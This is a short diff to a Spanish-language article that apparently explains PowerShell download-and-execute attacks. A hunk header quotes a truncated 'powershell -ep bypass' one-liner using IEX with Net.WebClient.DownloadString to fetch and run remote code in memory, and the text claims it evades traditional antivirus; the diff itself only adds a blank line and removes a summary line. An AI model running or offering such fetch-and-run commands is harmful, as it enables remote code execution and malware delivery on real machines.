@@ -148,6 +148,7 @@ powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://x
 ```
 
 Una sola línea = ejecución completa.
+
 Evita:
 
 * Antivirus tradicionales
@@ -194,9 +195,3 @@ Y cualquier sistema que haga eso siempre será un objetivo.
 * `DownloadString()` → descarga texto
 * `DownloadFile()` → guarda archivo
 * `IEX` → ejecuta texto
-
-Combinados:
-
-👉 Descarga + Ejecuta en memoria.
-
----
